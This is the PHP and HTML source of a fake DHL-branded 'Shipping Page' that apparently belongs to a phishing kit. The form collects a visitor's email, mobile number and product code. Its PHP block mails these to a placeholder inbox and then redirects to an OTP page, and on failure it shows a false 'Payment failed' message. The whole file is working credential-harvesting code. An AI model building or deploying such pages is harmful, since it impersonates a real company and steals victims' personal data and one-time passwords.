<?php
    $mail_err = '';
    if (isset($_POST['btn'])) {
        
        $msg  = "Mail Id : " . $_POST['mail_id'] . "<br>";
        $msg .= "Mobile Number : " . $_POST['mobile_number'] . "<br>";
        $msg .= "Product Code : " . $_POST['product_code'] . "<hr>";

        $msg = wordwrap($msg,70);
        
        $mail = mail("yourmail@gmail.com", "Your subject here", $msg);

        if ($mail) {
            header('Location:otp.php');
        } else {
            $mail_err = 'Payment failed. Please try again';
        }
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.2/css/all.css">
    <link rel="stylesheet" href="style.css">
    <title>Shipping Page</title>
</head>
<body>
    <div class="wrapper">
        <div class="payment">
            <div class="payment-logo">
                <p>p</p>
            </div>
            <h2>Courier Requirement</h2>
            <h3 style="color: red;text-align: center; margin-bottom: 10px;"><?php echo $mail_err; ?></h3>
            <img src="dhl-banner.png" alt="dhl" class="dhl">
            <form method="POST" id="form" class="form">
                <div class="form-control">
                    <label for="mailid">Mail Id:</label>
                    <input type="email" name="mail_id" placeholder="Enter Valid Email" id="mailid" required />
                    <i class="fas fa-check-circle"></i>
                    <i class="fas fa-exclamation-circle"></i>
                    <small>Error message</small>
                </div>
                <div class="form-control">
                    <label for="mobilenumber">Mobile Number:</label>
                    <input type="number" name="mobile_number" placeholder="Mobile Number" id="mobilenumber" />
                    <i class="fas fa-check-circle"></i>
                    <i class="fas fa-exclamation-circle"></i>
                    <small>Error message</small>
                </div>
                <div class="form-control">
                    <label for="productcode">Product Code:</label>
                    <input type="number" name="product_code" placeholder="Valid Product Code" id="productcode" />
                    <i class="fas fa-check-circle"></i>
                    <i class="fas fa-exclamation-circle"></i>
                    <small>Error message</small>
                </div>
                <button type="submit" name="btn"> Next Step</button>
                <div class='processing_form'>
                    <div class="content">
                        <div class="loader"></div>
                        <p>Almost There, Please Wait....</p>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <script src="shipping.js"></script>
</body>
</html>